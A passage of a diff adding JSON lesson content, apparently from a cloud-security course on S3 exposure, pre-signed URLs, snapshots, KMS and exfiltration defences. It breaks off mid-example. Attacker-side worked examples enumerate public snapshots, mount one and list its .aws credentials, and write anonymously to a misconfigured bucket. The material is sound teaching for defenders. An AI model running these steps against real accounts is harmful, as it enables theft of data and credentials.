+                  "label": "Listable (see object names)"
+                },
+                {
+                  "id": "read",
+                  "label": "Readable (download data)",
+                  "highlighted": true
+                },
+                {
+                  "id": "write",
+                  "label": "Writable (upload/overwrite)",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "exists",
+                  "to": "list",
+                  "label": "ListBucket allowed"
+                },
+                {
+                  "from": "exists",
+                  "to": "read",
+                  "label": "GetObject allowed"
+                },
+                {
+                  "from": "exists",
+                  "to": "write",
+                  "label": "PutObject allowed"
+                }
+              ]
+            },
+            "check": {
+              "question": "A public bucket allows anonymous PutObject but NOT GetObject or ListBucket. Why can this still be a serious finding?",
+              "options": [
+                "It cannot be - without read access there is no impact",
+                "An attacker can upload/overwrite objects: plant malware, deface a bucket-hosted site, or poison data a pipeline ingests",
+                "Writable access only lets you delete your own uploads",
+                "PutObject requires AWS credentials, so it is never anonymous"
+              ],
+              "correctIndex": 1,
+              "explanation": "Writable public buckets let an attacker inject content: malware hosting under a trusted domain, website defacement if the bucket backs a site, or poisoning files that downstream systems read and trust. Write can be worse than read."
+            }
+          },
+          {
+            "title": "Worked Example: Classify a Hit",
+            "body": "Here s3scanner finds an existing bucket and probes it. Read the output carefully to assign the exposure level. The --no-sign-request checks confirm what an anonymous user can actually do.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "s3scanner -bucket acme-dev-uploads scan",
+                  "output": "exists | read_acl: AllUsers [FULL_CONTROL] | listable: YES | writable: YES"
+                },
+                {
+                  "command": "aws s3 ls s3://acme-dev-uploads --no-sign-request",
+                  "output": "2026-02-10 11:02   91234 users-export.json   (LISTABLE confirmed)"
+                },
+                {
+                  "command": "echo test > p.txt && aws s3 cp p.txt s3://acme-dev-uploads/ --no-sign-request",
+                  "output": "upload: ./p.txt to s3://acme-dev-uploads/p.txt   (WRITABLE confirmed)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Hunt the Open Bucket (Lab)",
+            "body": "In the module lab 'Hunt the Open Bucket', you deliberately create several of your OWN misconfigured buckets, then play attacker against them:\n\n1. Create buckets with different mistakes - one public-list ACL, one public-read bucket policy, one public-write.\n2. Run s3scanner / cloud_enum against your own names and record what each reports.\n3. For every hit, confirm the TRUE level (list vs read vs write) with --no-sign-request CLI calls.\n4. Remediate each one and re-scan to prove it is now closed.\n\nAuthorisation rule: only your own assets, or a program with written safe-harbour. Guessing a stranger's bucket name is reconnaissance against someone else's data - never do that unscoped."
+          },
+          {
+            "title": "Defend and Why It Matters",
+            "body": "Defence is the inverse of discovery:\n\n- Turn on account-level Block Public Access so permutation attacks find nothing readable.\n- Disable ACLs (Object Ownership = bucket owner enforced).\n- Avoid guessable, meaningful bucket names for sensitive data; add random suffixes so names cannot be enumerated from your brand.\n- Monitor: AWS Config has managed rules (s3-bucket-public-read-prohibited, s3-bucket-public-write-prohibited) that flag any bucket that becomes public.\n\nWhy it matters: bucket enumeration is cheap, fast, and endlessly automated by attackers scanning the whole internet. The companies that avoid headlines are the ones whose scans simply come back empty."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m5-3",
+        "moduleId": "cloud-m5",
+        "number": 30,
+        "title": "Pre-signed URLs & Temporary Access",
+        "type": "theory",
+        "week": 2,
+        "description": "Pre-signed URLs grant time-boxed object access without credentials — powerful and frequently misused. Students learn how they're abused and bounded.",
+        "keyPoints": [
+          "How pre-signed URLs embed a signature and expiry in the query string",
+          "Over-long expiries and URL leakage via logs/referrers/caches",
+          "The signer's permissions bound the URL — a powerful signer makes a powerful URL",
+          "Abuse: upload pre-signed URLs enabling arbitrary object writes",
+          "Mitigation: short expiry, scoped signer, no secrets in URL parameters"
+        ],
+        "slides": [
+          {
+            "title": "What a Pre-signed URL Is",
+            "body": "A pre-signed URL is a normal-looking web link that grants temporary access to a single private S3 object - without the recipient needing any AWS credentials. You generate it; anyone holding the link can use it until it expires.\n\nAnalogy: it is a hotel key-card for one room that stops working at checkout. You can hand it to a guest; they do not need to be a registered hotel resident. The power - and the danger - is that the card works for whoever holds it, and sometimes it is set to never expire."
+          },
+          {
+            "title": "How It Works: Signature + Expiry in the URL",
+            "body": "A pre-signed URL packs the permission INTO the query string. S3 checks that signature on each request - no login happens.\n\nKey query parameters:\n- X-Amz-Credential: whose keys signed it\n- X-Amz-Date and X-Amz-Expires: when it was signed and how many seconds it stays valid\n- X-Amz-Signature: an HMAC proving the request was authorised by the signer\n- X-Amz-SignedHeaders: which headers are covered\n\nAnyone who presents this exact URL before expiry gets the object. The signature cannot be forged, but it also cannot tell WHO is using it - possession is permission.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Anyone with link",
+              "rightLabel": "S3",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GET object with signed query string",
+                  "payload": "GET /report.pdf?X-Amz-Credential=AKIA...&X-Amz-Expires=3600&X-Amz-Signature=8f2c...&X-Amz-Date=20261116T090000Z"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK (object bytes) - no credentials asked",
+                  "payload": "HTTP/1.1 200 OK\\nContent-Type: application/pdf\\n<file bytes>"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Generating One",
+            "body": "Generating a pre-signed URL is a single CLI call. Here --expires-in sets the lifetime in seconds. Notice the whole grant lives in the URL that comes back.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 presign s3://acme-reports/q1-financials.pdf --expires-in 300",
+                  "output": "https://acme-reports.s3.amazonaws.com/q1-financials.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEXAMPLE%2F20261116%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261116T090000Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz-Signature=8f2c91..."
+                },
+                {
+                  "command": "curl -s -o out.pdf -w '%{http_code}\\n' \"https://acme-reports.s3.amazonaws.com/q1-financials.pdf?...&X-Amz-Expires=300&X-Amz-Signature=8f2c91...\"",
+                  "output": "200   <- works for 5 minutes, then returns 403 AccessDenied"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Signer's Permissions Bound the URL",
+            "body": "This is the rule people miss: a pre-signed URL carries the permissions of WHOEVER signed it, scoped to the operation requested. If an admin role with full S3 access signs a PutObject URL, that one link can write anywhere that role could.\n\nSo a 'powerful signer makes a powerful URL'. The classic mistake is signing with a broad service role when the task only needed to share one file. If that URL leaks, the attacker inherits a slice of the signer's power for the chosen action - not the whole account, but more than you intended.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Scoped signer (good)",
+                  "points": [
+                    "Role can only GET one prefix",
+                    "URL = read one file",
+                    "Leak impact: that file only"
+                  ]
+                },
+                {
+                  "label": "Over-broad signer (bad)",
+                  "points": [
+                    "Admin role signs the URL",
+                    "URL inherits wide power for that action",
+                    "Leak impact: far beyond intended"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How They Get Abused",
+            "body": "Two abuse patterns dominate:\n\n1. LEAKAGE of read URLs. Because the whole grant is in the URL, it leaks everywhere URLs leak: web-server access logs, the HTTP Referer header sent to third-party sites, browser history, CDN caches, Slack/email previews, screenshots. A long expiry turns a brief share into a durable credential.\n\n2. UPLOAD (PutObject) pre-signed URLs. Apps often hand the browser a pre-signed PUT so users can upload directly to S3. If the URL is not tightly constrained (content-type, size, exact key), an attacker who obtains it can write ARBITRARY objects - overwrite other files, plant web shells, or poison data.",
+            "check": {
+              "question": "A web app generates a pre-signed URL with --expires-in 604800 (7 days) and the user opens it, which then appears in the third-party analytics service's logs via the Referer header. What is the core problem?",
+              "options": [
+                "Pre-signed URLs are always insecure and should never be used",
+                "The long expiry plus URL leakage means anyone who sees the logged URL can access the object for a week",
+                "The analytics service decrypted the signature",
+                "Referer headers cannot contain URLs"
+              ],
+              "correctIndex": 1,
+              "explanation": "The grant lives in the URL. A 7-day expiry combined with the URL leaking into third-party logs (via Referer) hands a week-long access credential to anyone reading those logs. Short expiry limits the window."
+            }
+          },
+          {
+            "title": "Finding and Testing Pre-signed URL Issues",
+            "body": "As a tester, look for:\n\n- Long expiries: decode X-Amz-Expires. Values like 604800 (7d) or the 7-day maximum are a red flag for anything sensitive.\n- URL leakage: check whether signed URLs appear in server logs, CDN caches, or are sent cross-origin (Referer). Load the object in a page that links out and watch the outbound request.\n- Over-scoped upload URLs: given a presigned PUT, try changing the object key, the content-type, or uploading a much larger/executable file. If S3 accepts it, the signer did not constrain the request.\n- Replay: confirm the same URL works from a different IP/browser - it should, which is exactly why leakage matters."
+          },
+          {
+            "title": "Defend: Short, Scoped, Clean",
+            "body": "Three mitigations map directly to the three problems:\n\n1. SHORT expiry. Set the smallest lifetime that works - seconds to a few minutes for interactive downloads, not days. The max is 7 days for SigV4; rarely go near it.\n2. SCOPED signer. Sign with a narrowly-permissioned role (one prefix, one action), never a broad admin or service role. The URL can never exceed the signer.\n3. CONSTRAIN uploads. For presigned PUT/POST, pin the exact key, enforce Content-Type and content-length-range conditions, so an attacker cannot repurpose the URL to write elsewhere.\n\nAlso: never put secrets in URL query parameters, and prefer serving via CloudFront signed URLs/cookies when you need auditable, revocable access at scale."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Pre-signed URLs are everywhere - every 'download your invoice' or 'upload your photo' button likely uses one. They are a legitimate, well-designed feature, but they externalise a credential into a shareable string.\n\nThe failure mode is quiet: no bucket is 'public', Block Public Access is on, yet data still walks out because a long-lived signed URL leaked, or an upload URL was repurposed to overwrite trusted files. Treat every pre-signed URL as a temporary bearer credential - because that is exactly what it is - and the short/scoped/clean discipline keeps it safe."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m5-4",
+        "moduleId": "cloud-m5",
+        "number": 31,
+        "title": "Snapshots, Backups & Secondary Copies",
+        "type": "theory",
+        "week": 2,
+        "description": "Data leaks from copies as often as from the primary store. EBS/RDS snapshots, AMIs and backups shared too widely are a classic exfiltration route.",
+        "keyPoints": [
+          "Public or over-shared EBS/RDS snapshots and AMIs",
+          "Mounting a shared snapshot in your own account to read its data",
+          "DynamoDB/RDS exports landing in open buckets",
+          "Cross-region/cross-account replication leaking data outside the boundary",
+          "Mitigation: snapshot-sharing audits, default-private, encryption with your own KMS key"
+        ],
+        "slides": [
+          {
+            "title": "What Snapshots and Secondary Copies Are",
+            "body": "Your primary database or disk is usually guarded carefully. But clouds constantly make COPIES of that data for backup and recovery: EBS snapshots (point-in-time copies of a disk volume), RDS snapshots (database backups), AMIs (machine images that can include disk data), and exports to S3.\n\nAnalogy: you lock your original diary in a safe, but you also leave photocopies in a drawer, in the attic, and one you mailed to a friend. Attackers know the copy is often easier to grab than the original. Data leaks from the drawer as often as from the safe."
+          },
+          {
+            "title": "How the Exposure Happens: Over-Sharing",
+            "body": "AWS lets you SHARE a snapshot or AMI with other accounts, or make it PUBLIC, by editing a simple permissions attribute. This is meant for legitimate sharing (e.g. giving a partner a golden image). The danger: 'public' means every AWS account on earth can see and copy it.\n\nThe mistake is usually a one-line error - setting a snapshot's create-volume permission to 'all' (public) instead of a specific account ID, or forgetting to un-share after a project ends. The snapshot still sits quietly in your account, but a copy of your data is now reachable by strangers.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Primary data",
+                  "detail": "guarded DB / volume"
+                },
+                {
+                  "label": "Snapshot taken",
+                  "detail": "point-in-time copy"
+                },
+                {
+                  "label": "Shared/public",
+                  "detail": "createVolumePermission = all, or wrong account id"
+                },
+                {
+                  "label": "Attacker copies",
+                  "detail": "copies snapshot into own account"
+                },
+                {
+                  "label": "Mounts & reads",
+                  "detail": "full filesystem access to your data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Mounting a Shared Snapshot",
+            "body": "If a snapshot is public or shared to the attacker's account, they do not need your credentials. They create a volume from it IN THEIR OWN account and read the filesystem directly. Here is the attacker's side.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 describe-snapshots --restorable-by-user-ids all --filters Name=description,Values='*acme*' --query 'Snapshots[].SnapshotId'",
+                  "output": "[ \"snap-0a1b2c3d4e5f6a7b8\" ]   <- a snapshot you can restore = shared to you/public"
+                },
+                {
+                  "command": "aws ec2 create-volume --snapshot-id snap-0a1b2c3d4e5f6a7b8 --availability-zone us-east-1a",
+                  "output": "VolumeId: vol-0f9e8d7c   (copy of victim's disk, now in attacker account)"
+                },
+                {
+                  "command": "sudo mount /dev/xvdf1 /mnt/loot && ls /mnt/loot/home/ubuntu/.aws",
+                  "output": "config  credentials   <- long-lived AWS keys readable from the disk image"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants: Not Just EBS",
+            "body": "Snapshots are one route; secondary copies leak in several shapes:\n\n- RDS/Aurora snapshots shared or made public - the whole database restorable by others.\n- AMIs made public that bake in sensitive files, embedded credentials, or source code.\n- DynamoDB and RDS EXPORTS that land in an S3 bucket - if that bucket is public (back to module 5-1/5-2), the export is too.\n- Cross-region / cross-account REPLICATION that quietly copies data outside your security boundary, sometimes into an account with weaker controls.\n\nEvery one is the same lesson: the data's security is only as strong as its weakest copy.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Copy types that leak",
+                  "points": [
+                    "Public EBS snapshot",
+                    "Public RDS snapshot",
+                    "Public AMI with secrets",
+                    "Export to open S3 bucket",
+                    "Replication to weaker account"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to Find and Test This",
+            "body": "As a tester (against your OWN account or an authorised scope):\n\n- List snapshots whose permissions are 'all' (public): aws ec2 describe-snapshot-attribute --attribute createVolumePermission for each snapshot, or scan with Prowler / ScoutSuite which flag public snapshots and AMIs automatically.\n- Check images: aws ec2 describe-images --executable-users all and look for yours.\n- Check RDS: aws rds describe-db-snapshots --snapshot-type public (and describe-db-snapshot-attributes for shared-account lists).\n- Follow exports: find DynamoDB/RDS export tasks and confirm the destination bucket is private.\n\nProwler check-ids like ec2_ebs_public_snapshot and rds_snapshot_not_public give you this in one scan.",
+            "check": {
+              "question": "An attacker runs 'aws ec2 describe-snapshots --restorable-by-user-ids all' in THEIR account and your snapshot appears. What have they already proven, and what is their next step?",
+              "options": [
+                "Nothing - they still need your AWS credentials to read it",
+                "The snapshot is shared to them or public; they create a volume from it in their own account and mount it to read your data",
+                "They must break the snapshot's encryption first regardless of key access",
+                "They can only see the snapshot ID but never its contents"
+              ],
+              "correctIndex": 1,
+              "explanation": "'restorable-by-user-ids all' returning your snapshot means it is shared/public. They can create a volume from it in their own account and mount the filesystem - no victim credentials required. Encryption only stops them if they lack access to the KMS key."
+            }
+          },
+          {
+            "title": "Do It: Snapshot Exfil (Lab)",
+            "body": "The module's 'Snapshot Exfil' lab makes this concrete and safe using two accounts you control:\n\n1. In account A, create an EBS volume, put a marker file on it, snapshot it.\n2. Share the snapshot's createVolumePermission to account B (simulating the over-share mistake).\n3. From account B, list restorable snapshots, create a volume from the snapshot, attach and mount it, and read the marker file - proving cross-account exfiltration with no access to account A's console.\n4. Lock it down: remove the sharing, encrypt new snapshots with a customer-managed KMS key, and re-test to show account B can no longer create the volume (it lacks KMS decrypt).\n\nStay in your own accounts - never target a snapshot you were not authorised to."
+          },
+          {
+            "title": "Defend: Audit, Default-Private, Encrypt",
+            "body": "Three controls close the copy-leak path:\n\n1. AUDIT sharing continuously. AWS Config rules (ebs-snapshot-public-restorable-check, rds-snapshot-public-prohibited) and GuardDuty findings alert the moment a snapshot or AMI becomes public. Fix fast.\n2. DEFAULT-PRIVATE. Never set create permissions to 'all'. Share to specific account IDs only, and un-share when done. Block public AMIs at the account level with the 'block public access for AMIs' setting.\n3. ENCRYPT with your own KMS key (CMK). A snapshot encrypted with a customer-managed key cannot be read by another account unless you ALSO grant them kms:Decrypt on that key. Encryption turns 'I shared it by mistake' into 'and they still cannot read it'."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Primary stores get the security budget; their copies get forgotten. Real incidents have exposed entire databases through a single public RDS snapshot, and credentials through disk images left public. Attackers actively scan for restorable snapshots because it is a low-noise way to steal data without ever touching the running system - no login attempts, no alarms on the primary.\n\nThe principle to carry forward: classify and protect data by its SENSITIVITY, and apply that protection to every copy - snapshot, backup, export, replica. Your weakest copy sets your real security posture."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m5-5",
+        "moduleId": "cloud-m5",
+        "number": 32,
+        "title": "Encryption at Rest & KMS",
+        "type": "theory",
+        "week": 2,
+        "description": "Encryption is only as good as key access. Students connect SSE-KMS to the KMS key policy so they understand that decrypt permission, not encryption itself, is the control.",
+        "keyPoints": [
+          "SSE-S3 vs SSE-KMS vs SSE-C; bucket keys to cut KMS cost",
+          "The KMS key policy and grants decide who can decrypt",
+          "Customer-managed keys (CMK) vs AWS-managed keys and auditability",
+          "Enforcing encryption via bucket policy (deny unencrypted PutObject)",
+          "Cross-account decrypt requires both IAM and key-policy allow"
+        ],
+        "slides": [
+          {
+            "title": "What Encryption at Rest Really Controls",
+            "body": "Encryption at rest means the data on disk is stored as ciphertext, unreadable without a key. In S3 this is 'server-side encryption' (SSE): S3 encrypts objects as it writes them and decrypts as it reads them.\n\nThe crucial insight for security: once S3 is doing the encrypting and decrypting for you, the encryption is NOT the control - KEY ACCESS is. If a caller is allowed to decrypt, they see plaintext automatically. So the real question is never 'is it encrypted?' but 'who is permitted to decrypt it?' That permission lives in KMS.\n\nAnalogy: a safe is only as secure as the list of people allowed to hold the key - the thickness of the steel is irrelevant if everyone has a copy."
+          },
+          {
+            "title": "The Three SSE Modes",
+            "body": "S3 offers three server-side encryption modes, differing in WHO holds and controls the key:\n\n- SSE-S3: AWS manages the keys entirely. Simple, free, but you have no visibility or control over key use.\n- SSE-KMS: keys live in AWS KMS under YOUR control. You get a key policy, grants, and a CloudTrail log of every decrypt. This is the security-relevant option.\n- SSE-C: YOU supply the key with every request; AWS never stores it. Maximum control, maximum operational burden.\n\nSSE-KMS is where access control and auditing actually happen, so it is the focus.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "SSE-S3",
+                  "points": [
+                    "AWS-managed key",
+                    "No key policy visibility",
+                    "No per-decrypt audit"
+                  ]
+                },
+                {
+                  "label": "SSE-KMS",
+                  "points": [
+                    "Your KMS key",
+                    "Key policy + grants control decrypt",
+                    "CloudTrail logs every Decrypt"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "SSE-C",
+                  "points": [
+                    "You provide the key each request",
+                    "AWS stores nothing",
+                    "You bear all key management"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How SSE-KMS Decrypt Is Gated",
+            "body": "With SSE-KMS, reading an object is a TWO-permission operation. The caller must be allowed to:\n\n1. s3:GetObject on the object (the S3 layer), AND\n2. kms:Decrypt on the KMS key that encrypted it (the KMS layer).\n\nMiss either and the read fails. This is powerful: even if an S3 bucket policy is too loose, a tight KMS key policy can still stop decryption. The KMS key policy is a separate gate that an S3 misconfiguration alone cannot open.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "GetObject request",
+                  "detail": "caller asks for object"
+                },
+                {
+                  "label": "S3 authz check",
+                  "detail": "s3:GetObject allowed?"
+                },
+                {
+                  "label": "KMS authz check",
+                  "detail": "kms:Decrypt on the key allowed?"
+                },
+                {
+                  "label": "Decrypt & return",
+                  "detail": "only if BOTH pass"
+                }
+              ]
+            },
+            "check": {
+              "question": "An object is encrypted with SSE-KMS. A user has s3:GetObject allowed on the bucket but the KMS key policy does NOT grant them kms:Decrypt. What happens when they download it?",
+              "options": [
+                "They get the plaintext - S3 access is enough",
+                "They get the ciphertext bytes and must decrypt locally",
+                "The request fails with AccessDenied because KMS decrypt is also required",
+                "S3 automatically decrypts using the AWS-managed key"
+              ],
+              "correctIndex": 2,
+              "explanation": "SSE-KMS requires BOTH s3:GetObject AND kms:Decrypt on the key. Without decrypt permission the read is denied - the KMS key policy is an independent gate that S3 permissions cannot bypass."
+            }
+          },
+          {
+            "title": "Worked Example: The Two Gates in Action",
+            "body": "Here one role can read the object and another cannot - the only difference is kms:Decrypt on the key, even though both have identical S3 permissions.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 cp s3://acme-secure/payroll.csv . --profile reader-with-kms",
+                  "output": "download: s3://acme-secure/payroll.csv to ./payroll.csv   (s3:GetObject + kms:Decrypt both allowed)"
+                },
+                {
+                  "command": "aws s3 cp s3://acme-secure/payroll.csv . --profile reader-no-kms",
+                  "output": "fatal error: An error occurred (AccessDenied): ... ciphertext refers to a customer master key that does not exist ... or you do not have kms:Decrypt"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Customer-Managed Keys vs AWS-Managed, and Bucket Keys",
+            "body": "Within SSE-KMS you choose the key type:\n\n- AWS-MANAGED key (aws/s3): auto-created, you cannot edit its key policy. Encrypted, but you cannot scope decrypt per-role or restrict it - limited control.\n- CUSTOMER-MANAGED key (CMK): you own the key policy, can grant/deny specific roles, enable rotation, and share cross-account deliberately. This is what you want for sensitive data and auditability.\n\nCost note: every SSE-KMS decrypt is a KMS API call you pay for. S3 BUCKET KEYS reduce this dramatically by caching a short-lived bucket-level key, cutting KMS request volume (and cost) by up to ~99% without weakening the model. Turn bucket keys on by default for KMS-encrypted buckets."
+          },
+          {
+            "title": "Enforcing Encryption with a Bucket Policy",
+            "body": "Default encryption ensures NEW objects are encrypted, but you can go further and DENY any upload that is not encrypted the way you require. A bucket policy condition rejects PutObject requests lacking the correct SSE header - closing the gap where someone uploads plaintext or uses the wrong key.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat deny-unencrypted.json",
+                  "output": "{\n  \"Effect\": \"Deny\",\n  \"Principal\": \"*\",\n  \"Action\": \"s3:PutObject\",\n  \"Resource\": \"arn:aws:s3:::acme-secure/*\",\n  \"Condition\": { \"StringNotEquals\": { \"s3:x-amz-server-side-encryption\": \"aws:kms\" } }\n}"
+                },
+                {
+                  "command": "aws s3api put-object --bucket acme-secure --key test.txt --body test.txt",
+                  "output": "An error occurred (AccessDenied): explicit deny - object was not sent with SSE-KMS"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Cross-Account Decrypt Needs Both Sides",
+            "body": "A frequent real-world gotcha: sharing KMS-encrypted data with another account requires TWO allows, on two sides:\n\n1. The KMS KEY POLICY (and/or a grant) in YOUR account must allow the other account's principal to call kms:Decrypt.\n2. The IAM POLICY in the OTHER account must allow its principal to call kms:Decrypt on your key's ARN.\n\nIf either is missing, decryption fails. This 'both must allow' design is a feature - it means you cannot accidentally expose encrypted data to another account just by sharing the bucket; the key owner must also consent. It is the same principle that protected the encrypted snapshot in the previous topic."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Teams tick an 'encryption enabled' compliance box and assume the data is safe. But if the key is AWS-managed and everyone in the account can decrypt, encryption at rest stops only someone who physically steals the disks from an AWS data centre - a threat AWS already handles. It does nothing against the real attacker who has over-broad IAM or a misconfigured bucket.\n\nThe mature mental model: encryption at rest is a KEY-ACCESS control, not a data-at-rest control. Design the KMS key policy - who may decrypt, logged in CloudTrail - with the same rigour as any other authorisation boundary. That is what turns encryption from a checkbox into a real control, and it is exactly how encrypted snapshots, Secrets Manager, and SSE-KMS all gate access."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m5-6",
+        "moduleId": "cloud-m5",
+        "number": 33,
+        "title": "Data-Exfiltration Paths & Prevention",
+        "type": "exercise",
+        "week": 2,
+        "description": "Ties the module together: enumerate every way bytes can leave a bucket and the control that stops each. Students build a locked-down bucket and try to beat it.",
+        "keyPoints": [
+          "Egress via public read, pre-signed URL, replication, snapshot, or over-broad IAM",
+          "S3 Block Public Access + account-level enforcement",
+          "VPC endpoints and bucket policies restricting access to a VPC/org",
+          "GuardDuty S3 protection and Macie for sensitive-data discovery",
+          "CloudTrail data events for object-level read/write visibility"
+        ],
+        "slides": [
+          {
+            "title": "What This Topic Ties Together",
+            "body": "This is the capstone of the module: every previous topic described ONE way bytes can leave a bucket. Now you enumerate ALL of them at once and map each exit door to the single control that bolts it shut.\n\nAnalogy: you have inspected each window and door of a house separately. Now you walk the whole perimeter with a checklist, confirming nothing is left ajar - then you try to break in yourself to prove it. Defence only counts when you have tested that every path is actually closed."
+          },
+          {
+            "title": "The Exfiltration Map",
+            "body": "Data can leave an S3 bucket through at least five paths, each from an earlier topic:\n\n1. Public read (ACL/policy Principal: *) - topic 5-1/5-2\n2. Pre-signed URL (leaked or over-scoped) - topic 5-3\n3. Snapshot/backup/export copy over-shared - topic 5-4\n4. Replication copying data outside the boundary - topic 5-4\n5. Over-broad IAM - a role or user with more s3:GetObject reach than needed\n\nA locked-down bucket is one where ALL five are closed. Missing any one undoes the rest.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "bucket",
+                  "label": "Bucket data",
+                  "highlighted": true
+                },
+                {
+                  "id": "pub",
+                  "label": "Public read"
+                },
+                {
+                  "id": "url",
+                  "label": "Pre-signed URL"
+                },
+                {
+                  "id": "snap",
+                  "label": "Snapshot/export copy"
+                },
+                {
+                  "id": "repl",
+                  "label": "Replication"
+                },
+                {
+                  "id": "iam",
+                  "label": "Over-broad IAM"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "bucket",
+                  "to": "pub",
+                  "label": "exit 1"
+                },
+                {
+                  "from": "bucket",
+                  "to": "url",
+                  "label": "exit 2"
+                },
+                {
+                  "from": "bucket",
+                  "to": "snap",
+                  "label": "exit 3"
+                },
+                {
+                  "from": "bucket",
+                  "to": "repl",
+                  "label": "exit 4"
+                },
+                {
+                  "from": "bucket",
+                  "to": "iam",
+                  "label": "exit 5"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Each Exit and Its Control",
+            "body": "The defensive discipline is one control per exit:\n\n- Public read -> account + bucket Block Public Access (BPA), ACLs disabled.\n- Pre-signed URL abuse -> short expiry, scoped signer, constrained uploads.\n- Snapshot/export leak -> default-private sharing, CMK encryption, sharing audits.\n- Replication outside boundary -> restrict/disable replication, encrypt with a key the destination lacks.\n- Over-broad IAM -> least-privilege policies, and a bucket/VPC policy that limits WHO and from WHERE.\n\nTwo controls deserve their own slides because they constrain the network and give visibility: VPC endpoints and monitoring.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Exit path",
+                  "points": [
+                    "Public read",
+                    "Pre-signed URL",
+                    "Snapshot copy",
+                    "Replication",
+                    "Over-broad IAM"
+                  ]
+                },
+                {
+                  "label": "Control that closes it",
+                  "points": [
+                    "Block Public Access",
+                    "Short/scoped URLs",
+                    "Default-private + CMK",
+                    "Restrict replication",
+                    "Least privilege + VPC policy"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Confining Access to Your Network",
+            "body": "Even with correct identities, you may want data to be reachable ONLY from inside your own network - never from the public internet, even with valid credentials.\n\nTwo tools combine for this:\n- A VPC GATEWAY ENDPOINT for S3 lets instances reach S3 privately, without traffic leaving AWS.\n- A BUCKET POLICY CONDITION on aws:sourceVpce (or aws:SourceVpc) then DENIES any request that did not arrive through that endpoint.\n\nResult: a stolen credential used from an attacker's laptop on the open internet is refused, because the request did not come through your VPC endpoint. You can similarly scope to your AWS Organization with aws:PrincipalOrgID.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker (internet)",
+              "rightLabel": "S3 bucket",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GetObject with stolen keys, from internet",
+                  "payload": "GET /payroll.csv (creds valid, but not via VPC endpoint)"
+                },
+                {
+                  "direction": "left",
+                  "label": "403 - bucket policy denies: aws:sourceVpce mismatch",
+                  "payload": "HTTP/1.1 403 AccessDenied (StringNotEquals aws:sourceVpce)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Seeing the Bytes Move: Detection",
+            "body": "Prevention can fail silently, so you also need to SEE access. Three AWS services give object-level visibility:\n\n- CloudTrail DATA EVENTS: log every object-level GetObject/PutObject/DeleteObject (S3 management events alone do NOT capture object reads - you must enable data events). This is your audit trail of who read what.\n- GuardDuty S3 PROTECTION: machine-learning detection of anomalous access - e.g. a credential suddenly reading thousands of objects, or access from a Tor exit node.\n- Amazon MACIE: scans buckets and classifies sensitive data (PII, credentials, financials), so you know WHICH buckets hold crown jewels and need the tightest controls.\n\nTogether: Macie finds the sensitive data, CloudTrail records access to it, GuardDuty alarms on abuse.",
+            "check": {
+              "question": "You enabled CloudTrail for the account but object-level GetObject calls are not appearing in the logs. Why, and what fixes it?",
+              "options": [
+                "CloudTrail cannot log S3 at all; use only GuardDuty",
+                "Management events don't capture object reads - you must enable S3 data events for that bucket",
+                "The objects are encrypted so reads are hidden",
+                "You must make the bucket public for logging to work"
+              ],
+              "correctIndex": 1,
+              "explanation": "CloudTrail management events cover bucket-level API calls, not per-object reads/writes. To log GetObject/PutObject you must explicitly enable S3 data events, which carry object-level visibility (at additional cost)."
+            }
+          },
+          {
+            "title": "Worked Example: Proving a Path Is Closed",
+            "body": "Defence is only real when tested. After locking a bucket, you re-run each exfiltration attempt and confirm it fails. Here the anonymous read and the stolen-credential-from-internet read are both refused.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 cp s3://acme-secure/payroll.csv . --no-sign-request",
+                  "output": "AccessDenied   (Block Public Access closes exit 1)"
+                },
+                {
+                  "command": "aws s3 cp s3://acme-secure/payroll.csv . --profile stolen-keys",
